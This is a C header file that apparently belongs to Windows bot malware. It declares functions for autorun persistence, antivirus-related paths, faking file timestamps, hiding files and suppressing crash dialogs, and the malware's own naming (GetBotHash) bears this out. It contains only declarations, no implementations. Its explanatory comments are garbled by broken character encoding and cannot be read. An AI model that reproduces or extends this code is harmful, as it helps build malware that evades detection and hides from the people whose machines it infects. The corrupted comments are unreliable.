#include <windows.h>

DWORD SignalFirstRun( DWORD dwParam );


//DWORD GetBotHash();
//WCHAR *GetBotPath();
//void AddToAutoRun( WCHAR *ModulePath );
//void AddToAutoRun( WCHAR *TempFileName );


WCHAR *GetStopAVPath();
WCHAR *GetMiniAVPath();

WCHAR *GetTempName();


WCHAR *GetShellFoldersKey( DWORD dwParam );

void CopyFileToTemp( WCHAR *Path, WCHAR *Temp );

void SetFakeFileDateTime(PCHAR Path);
void SetFakeFileDateTimeW(PWCHAR Path);


//----------------------------------------------------------------------------
//  IsHideFile - ������� ���������� ������, ���� ���������� ��������
//               ��������� ����
//----------------------------------------------------------------------------
BOOL IsHide( DWORD dwFileHash );
BOOL IsHideFile(PWCHAR FileName, ULONG FileNameLen, int ControlPoint);

//----------------------------------------------------------------------------
// DisableShowFatalErrorDialog - ������� ������������� ����� �����������
//         ������ ��� ������� ������� �� ����� ���������� ��������� � �����
//         ��������. ��� ����� �� ������ ���� ���������� ����� ���������
//----------------------------------------------------------------------------
void DisableShowFatalErrorDialog();
